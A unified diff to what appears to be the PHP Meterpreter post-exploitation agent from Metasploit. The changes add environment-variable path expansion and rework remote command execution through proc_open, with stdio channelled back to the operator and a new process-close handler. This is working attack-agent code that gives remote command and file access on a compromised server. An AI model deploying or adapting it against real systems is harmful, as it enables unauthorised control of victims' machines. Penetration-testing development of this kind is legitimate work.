@@ -267,12 +267,42 @@ function cononicalize_path($path) {
 }
 }
 
-# Need to nail down what this should actually do.  In ruby, it doesn't expand
-# environment variables but in the windows meterpreter it does
-if (!function_exists('stdapi_fs_expand_path')) {
-function stdapi_fs_expand_path($req, &$pkt) {
+
+#
+# Need to nail down what this should actually do.  Ruby's File.expand_path is
+# for cononicalizing a path (e.g., removing /./ and ../) and expanding "~" into
+# a path to the current user's homedir.  In contrast, Meterpreter has
+# traditionally used this to get environment variables from the server.
+#
+if (!function_exists('stdapi_fs_file_expand_path')) {
+function stdapi_fs_file_expand_path($req, &$pkt) {
     my_print("doing expand_path");
     $path_tlv = packet_get_tlv($req, TLV_TYPE_FILE_PATH);
+    $env = $path_tlv['value'];
+    if (!is_windows()) {
+        # Handle some basic windows-isms when we can
+        switch ($env) {
+        case "%COMSPEC%":
+            $path = "/bin/sh";
+            break;
+        case "%TEMP%":
+        case "%TMP%":
+            $path = "/tmp";
+            break;
+        default:
+            # Don't know what the user meant, just try it as an environment
+            # variable and hope for the best.
+            $path = getenv($env);
+        }
+    } else {
+        $path = getenv($env);
+    }
+    my_print("Returning with an answer of: '$path'");
+
+    if ($path) {
+        packet_add_tlv($pkt, create_tlv(TLV_TYPE_FILE_PATH, $path));
+        return ERROR_SUCCESS;
+    }
     return ERROR_FAILURE;
 }
 }
@@ -355,27 +385,27 @@ function stdapi_fs_stat($req, &$pkt) {
     $path = cononicalize_path($path_tlv['value']);
 
     $st = stat($path);
-	if ($st) {
-		$st_buf = "";
-		$st_buf .= pack("V", $st['dev']);
-		$st_buf .= pack("v", $st['ino']);
-		$st_buf .= pack("v", $st['mode']);
-		$st_buf .= pack("v", $st['nlink']);
-		$st_buf .= pack("v", $st['uid']);
-		$st_buf .= pack("v", $st['gid']);
-		$st_buf .= pack("v", 0);
-		$st_buf .= pack("V", $st['rdev']);
-		$st_buf .= pack("V", $st['size']);
-		$st_buf .= pack("V", $st['atime']);
-		$st_buf .= pack("V", $st['mtime']);
-		$st_buf .= pack("V", $st['ctime']);
-		$st_buf .= pack("V", $st['blksize']);
-		$st_buf .= pack("V", $st['blocks']);
-		packet_add_tlv($pkt, create_tlv(TLV_TYPE_STAT_BUF, $st_buf));
+    if ($st) {
+        $st_buf = "";
+        $st_buf .= pack("V", $st['dev']);
+        $st_buf .= pack("v", $st['ino']);
+        $st_buf .= pack("v", $st['mode']);
+        $st_buf .= pack("v", $st['nlink']);
+        $st_buf .= pack("v", $st['uid']);
+        $st_buf .= pack("v", $st['gid']);
+        $st_buf .= pack("v", 0);
+        $st_buf .= pack("V", $st['rdev']);
+        $st_buf .= pack("V", $st['size']);
+        $st_buf .= pack("V", $st['atime']);
+        $st_buf .= pack("V", $st['mtime']);
+        $st_buf .= pack("V", $st['ctime']);
+        $st_buf .= pack("V", $st['blksize']);
+        $st_buf .= pack("V", $st['blocks']);
+        packet_add_tlv($pkt, create_tlv(TLV_TYPE_STAT_BUF, $st_buf));
         return ERROR_SUCCESS;
-	} else {
+    } else {
         return ERROR_FAILURE;
-	}
+    }
 }
 }
 
@@ -397,25 +427,25 @@ function stdapi_fs_delete_file($req, &$pkt) {
 
 if (!function_exists('stdapi_fs_search')) {
 function stdapi_fs_search($req, &$pkt) {
-	my_print("doing search");
+    my_print("doing search");
 
-	$root_tlv = packet_get_tlv($req, TLV_TYPE_SEARCH_ROOT);
-	$root = cononicalize_path($root_tlv['value']);
-	$glob_tlv = packet_get_tlv($req, TLV_TYPE_SEARCH_GLOB);
-	$glob = cononicalize_path($glob_tlv['value']);
-	$recurse_tlv = packet_get_tlv($req, TLV_TYPE_SEARCH_RECURSE);
-	$recurse = $recurse_tlv['value'];
+    $root_tlv = packet_get_tlv($req, TLV_TYPE_SEARCH_ROOT);
+    $root = cononicalize_path($root_tlv['value']);
+    $glob_tlv = packet_get_tlv($req, TLV_TYPE_SEARCH_GLOB);
+    $glob = cononicalize_path($glob_tlv['value']);
+    $recurse_tlv = packet_get_tlv($req, TLV_TYPE_SEARCH_RECURSE);
+    $recurse = $recurse_tlv['value'];
 
     if (!$root) {
         $root = '.';
     }
 
     my_print("glob: $glob, root: $root, recurse: $recurse");
-	$flags = GLOB_PATH;
-	if ($recurse) {
-		$flags |= GLOB_RECURSE;
-	}
-	$files = safe_glob($root ."/". $glob, $flags);
+    $flags = GLOB_PATH;
+    if ($recurse) {
+        $flags |= GLOB_RECURSE;
+    }
+    $files = safe_glob($root ."/". $glob, $flags);
     if ($files and is_array($files)) {
         dump_array($files);
         foreach ($files as $file) {
@@ -477,6 +507,8 @@ $GLOBALS['processes'] = array();
 
 if (!function_exists('stdapi_sys_process_execute')) {
 function stdapi_sys_process_execute($req, &$pkt) {
+    global $channel_process_map;
+
     my_print("doing execute");
     $cmd_tlv = packet_get_tlv($req, TLV_TYPE_PROCESS_PATH);
     $args_tlv = packet_get_tlv($req, TLV_TYPE_PROCESS_ARGUMENTS);
@@ -489,36 +521,83 @@ function stdapi_sys_process_execute($req, &$pkt) {
     # If there was no command specified, well, a user sending an empty command
     # deserves failure.
     my_print("Cmd: $cmd $args");
-    $real_cmd = $cmd ." ". $args;
     if (0 > strlen($cmd)) {
         return ERROR_FAILURE;
     }
-    #my_print("Flags: $flags (" . ($flags & PROCESS_EXECUTE_FLAG_CHANNELIZED) .")");
+    $real_cmd = $cmd ." ". $args;
+
+    # Now that we've got the command built, run it. If it worked, we'll send
+    # back a handle identifier.
+    $handle = proc_open($real_cmd, array(array('pipe','r'), array('pipe','w'), array('pipe','w')), $pipes);
+    if (!is_resource($handle)) {
+        return ERROR_FAILURE;
+    }
+
+    if (is_callable('proc_get_status')) {
+        $status = proc_get_status($handle);
+        $pid = $status['pid'];
+    } else {
+        $pid = 0;
+    }
+
+    $proc = array( 'handle' => $handle, 'pipes' => $pipes );
+    packet_add_tlv($pkt, create_tlv(TLV_TYPE_PID, $pid));
+    packet_add_tlv($pkt, create_tlv(TLV_TYPE_PROCESS_HANDLE, count($processes)));
     if ($flags & PROCESS_EXECUTE_FLAG_CHANNELIZED) {
-        global $processes;
         my_print("Channelized");
-        $handle = proc_open($real_cmd, array(array('pipe','r'), array('pipe','w'), array('pipe','w')), $pipes);
-        if ($handle === false) {
-            return ERROR_FAILURE;
-        }
-        $pipes['type'] = 'stream';
+        # Then the client wants a channel set up to handle this process' stdio,
+        # register all the necessary junk to make that happen.
         register_stream($pipes[0]);
         register_stream($pipes[1]);
         register_stream($pipes[2]);
         $cid = register_channel($pipes[0], $pipes[1], $pipes[2]);
+        $channel_process_map[$cid] = $proc;
 
-        # associate the process with this channel so we know when to close it.
-        $processes[$cid] = $handle;
+        $proc['cid'] = $cid;
 
-        packet_add_tlv($pkt, create_tlv(TLV_TYPE_PID, 0));
-        packet_add_tlv($pkt, create_tlv(TLV_TYPE_PROCESS_HANDLE, count($processes)-1));
         packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_ID, $cid));
-    } else {
-        # Don't care about stdin/stdout, just run the command
-        my_cmd($real_cmd);
+    #} else {
+        # Otherwise, don't care about stdin/stdout, just run the command
     }
 
+    $processes[] = $proc;
+
     return ERROR_SUCCESS;
+}
+}
+
+
+if (!function_exists('stdapi_sys_process_close')) {
+function stdapi_sys_process_close($req, &$pkt) {
+    global $processes;
+    my_print("doing process_close");
+    $handle_tlv = packet_get_tlv($req, TLV_TYPE_PROCESS_HANDLE);
+    $proc = $processes[$handle_tlv['value']];
+
+    close_process($proc);
+
+    return ERROR_SUCCESS;
+}
+}
+
+if (!function_exists('close_process')) {
+function close_process($proc) {
+    if ($proc) {
+        my_print("Closing process handle {$proc['handle']}");
+        # In the case of a channelized process, this will be redundant as the
+        # channel_close will also try to close all of these handles.  There's no
+        # real harm in that, so go ahead and just always make sure they get
+        # closed.
+        foreach ($proc['pipes'] as $f) {
+            fclose($f);
+        }
+        # Don't use proc_close() here because it blocks waiting for the child
+        # to die.  Better to just send it a sigterm and move on.
+        proc_terminate($proc['handle']);
+        if ($proc['cid'] && $channel_process_map[$proc['cid']]) {
+            unset($channel_process_map[$proc['cid']]);
+        }
+    }
 }
 }
 
